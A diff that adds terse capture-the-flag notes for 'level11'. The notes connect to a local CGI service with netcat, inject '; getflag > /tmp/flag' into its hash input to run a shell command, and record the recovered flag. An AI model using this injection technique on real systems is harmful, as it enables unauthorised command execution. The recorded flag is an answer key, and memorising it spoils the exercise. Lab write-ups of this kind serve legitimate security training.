@@ -1,0 +1,10 @@
+Inspect file level11
+- CGI
+
+Connect to server
+- nc 127.0.0.1 5151
+
+Exploit hash function 
+- ; getflag > /tmp/flag
+- cat /tmp/flag
+-> fa6v5ateaw21peobuub8ipe6s
